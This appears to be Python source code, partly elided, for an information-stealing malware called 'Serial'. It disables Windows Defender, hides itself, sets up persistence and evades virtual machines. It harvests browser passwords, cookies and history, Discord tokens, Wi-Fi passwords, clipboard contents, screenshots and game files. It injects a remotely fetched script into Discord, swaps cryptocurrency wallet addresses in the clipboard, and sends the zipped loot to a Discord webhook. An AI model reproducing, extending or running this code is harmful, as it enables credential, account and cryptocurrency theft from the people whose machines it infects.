...
__config__ = {
    #Basic Options
    "SEwebhook": "%WEBHOOK_HERE%",
    "SEinjection_url": "https://raw.githubusercontent.com/Irax212/JaZxIrax/main/index.js",

    #Files Options
    "SEgetbrowsersfiles": "%_browsers_files%",
    "SEgetavfiles": "%_av_files%",
    "SEgetminecraft": "%minecraft_files%",
    "SEgetsysteme": "%_systeme_files%",
    "SEgetroblox": "%_roblox_files%",
    "SEgetscreenshot": "%_screen_files%",
    "SEgetclipboard": "%_clipboard_files%",
    "SEgetwifipassword": "%wifipassword_files%",
    ...
    "SEantidebug": '%_debugkiller%',
    "disabledefenderornot": "%Defender_disable%",

    #Crypto Options
    "SEcrypto_fucker": "%_address_replacer%",
    "SEBTCADD": "%_btc_address%",
    "SEETHADD": "%_eth_address%",
    "SEXCHADD": "%_xchain_address%",
    "SEPCHADD": "%_pchain_address%",
    "SECCHADD": "%_cchain_address%",
    "SEMONEADD": "%_monero_address%",
    "SEADAADD": "%_ada_address%",
    "SEDASHADD": "%_dash_address%",
...
SEmyregex_secret = "https://paste.bingner.com/paste/32ymn/raw"
reg_req = requests.get(SEmyregex_secret)
...
class auto_copy_wallet(Functions):
    def __init__(self):
        self.address_st3aler = self.find_in_config("SEcrypto_fucker")
        self.address_btc = self.find_in_config("SEBTCADD")
        self.address_eth = self.find_in_config("SEETHADD")
        self.address_xchain = self.find_in_config("SEXCHADD")
        self.address_pchain = self.find_in_config("SEPCHADD")
        self.address_cchain = self.find_in_config("SECCHADD")
        self.address_monero = self.find_in_config("SEMONEADD")
        self.address_ada = self.find_in_config("SEADAADD")
        self.address_dash = self.find_in_config("SEDASHADD")
...
class first_function_bc(Functions):
    def __init__(self):
        ...
        self.discord_webhook = self.find_in_config("SEwebhook")
        ...
        self.ineedtogetbrowsers = self.find_in_config("SEgetbrowsersfiles")

        self.ineedtogetav = self.find_in_config("SEgetavfiles")

        self.ineedtogetmc = self.find_in_config("SEgetminecraft")

        self.ineedtogetsys = self.find_in_config("SEgetsysteme")

        self.ineedtogetrblx = self.find_in_config("SEgetroblox")

        self.ineedtogetscreen = self.find_in_config("SEgetscreenshot")

        self.ineedtogetclipboard = self.find_in_config("SEgetclipboard")
        
        self.ineedtogetwifipassword = self.find_in_config("SEgetwifipassword")
        ...
        self.SEmycommand_secret = "https://paste.bingner.com/paste/fyqvp/raw"
        self.secretcommand = requests.get(self.SEmycommand_secret)
    ...
    def remoter_SEerr(self: str) -> str:
    ...
    def ping_on_running(self: str) -> str:
        ping1 = {
            "avatar_url": "https://raw.githubusercontent.com/Serial/Assets/main/Serial.png",
            "content": "@everyone",
        }
        ping2 = {
            "avatar_url": "https://raw.githubusercontent.com/Serial/Assets/main/Serial.png",
    ...
    async def init(self):
        ...
        self.hide_so()
        self.SEplease_disabledefender()
        self.remoter_SEerr()
        self.startup_so()

        if self.find_in_config("SEantidebug") and NoDebugg().inVM is True:
            self.SEexit_this()
        ...
        function_list = [
            self.screentimes,
            self.getmywifiSerial,
            self.getmyclipboard,
            self.SEplease_getmyAV,
                            ...
                            if re.match(r"discord_desktop_core-\d+", ___dir):
                                ...
                                if ntpath.exists(inj_path):
                                    if self.srtupl0c not in argv[0]:
                                        try:
                                            os.makedirs(
                                                inj_path + "Serial", exist_ok=True
                                            )
                                        except PermissionError:
                                            pass
                                    if self.regex_webhook_dsc in self.discord_webhook:
                                        f = httpx.get(
                                            self.find_in_config("SEinjection_url")
                                        ).text.replace(
        ...
        if ntpath.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    ...
                    return
                item["Serial_is_here"] = "https://github.com/Serial"
            ...
            with open(config, "a") as f:
                f.write("\n\n//blackface_is_here | https://github.com/Serial")
                        ...
                        for line in [
                            ...
                            for y in re.findall(self.encrypted_regex, line):
                                ...
                                if r.status_code == 200:
                                    uid = r.json()["id"]
                                    if uid not in self.SEid:
                                        self.tokens.append(token)
                                        self.SEid.append(uid)
            else:
                for filname in os.listdir(path):
                    if filname[-3:] not in ["log", "ldb"]:
                        continue
    ...
    def steal_history(self):
        ...
        if self.ineedtogetbrowsers == "yes":
            ...
            def SEpleaseextractwebsearch(db_cursor):
            ...
            for prof in os.listdir(self.chrmmuserdtt):
                if re.match(self.chrmrgx, prof):
                    ...
                    search_history = SEpleaseextractwebsearch(cursor)
                    web_history = SEpleaseextract(cursor)
    ...
    def getmyclipboard(self):
        if self.ineedtogetclipboard == "yes":
            output = Functions.SEfindClipboard()
            if len(output) > 0:
                with open(ntpath.join(self.dir, 'Systeme', 'Latest Clipboard.txt'), 'w', encoding= 'utf-8', errors= 'ignore') as file:
                    file.write("Serial | https://github.com/blackkface/Serial-Stealer\n\n" + output)


    
    def SEplease_getmyAV(self):
    ...
    def SEplease_disabledefender(self):
...
GoogleMaps: {self.googlemap}
    ...
    def finished_bc(self):
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write(
                                "CapeTown Create By blackface SOVIETIC | https://github.com/Serial\n\n"
                            )
        ...
        _zipfile = ntpath.join(self.appdata,  f"{self.getlange()}CapeTown_[{login_info}].zip")
        ...
        for tkn in self.tokens:
            tokens += f"{tkn}\n\n"
        fileCount = f"{file_count} CapeTown FILES: "
        embed = {
            "name": "Serial",
            "avatar_url": "https://raw.githubusercontent.com/Serial/Assets/main/Serial.png",
            "embeds": [
                {
                    "author": {
                        "name": f"Serial v3",
                        "url": "https://github.com/Serial",
                        "icon_url": "https://raw.githubusercontent.com/Serial/Assets/main/output-onlinegiftools.gif",
                    },
                    "color": 16711718,
                    "description": f"[Serial ON TOP]({self.googlemap})",
                    "fields": [
                        {
                            "name": "\u200b",
                            "value": f"""```ansi
...
{tokens if tokens else "tokens not found"}```
                    ...
                    "footer": {
                        "text": "Serial Create BY SHAMAN・https://github.com/Serial"
                    },
                }
            ],
        }
...
def writeforfile(data, name):
    ...
    with open(path, mode="w", encoding="utf-8") as f:
        f.write(f"Created BY SHAMAN | https://github.com/Serial\n\n")
        for line in data:
            if line[0] != "":
                f.write(f"{line}\n")
...
def Find_Passw(path, arg):
    ...
    writeforfile(NotPSSW, "SEallpasswords")


Cookies = []


def Get_SECook(path, arg):
    global Cookies
    if not os.path.exists(path):
        return
    ...
    writeforfile(Cookies, "SEallcookies")
...
def SEGather_All():
    ...
    thread_bccookies = []
    for patt in browserPaths:
        a = threading.Thread(target=Get_SECook, args=[patt[0], patt[4]])
        a.start()
    ...
    for file in ["SEallpasswords.txt", "SEallcookies.txt"]:
...
def CreateFolder_(pathF, keywords):
    ...
    for file in listOfFile:
        ...
        if i <= maxfilesperdir:
            ...
            break
    SEcreate_files.append(["folder", pathF + "/", ffound])


SEcreate_files = []


def SEcreate_file(path, keywords):
    global SEcreate_files
    fifound = []
        ...
        for worf in keywords:
            if worf in file.lower():
                ...
                if os.path.isdir(path + "/" + file):
                    ...
                    break
    SEcreate_files.append(["folder", path, fifound])
...
def check_spec_bc():
    ...
    for patt in path2search:
        check_spec_bc = threading.Thread(
            target=SEcreate_file, args=[patt, key_wordsFiles]
        )
        check_spec_bc.start()
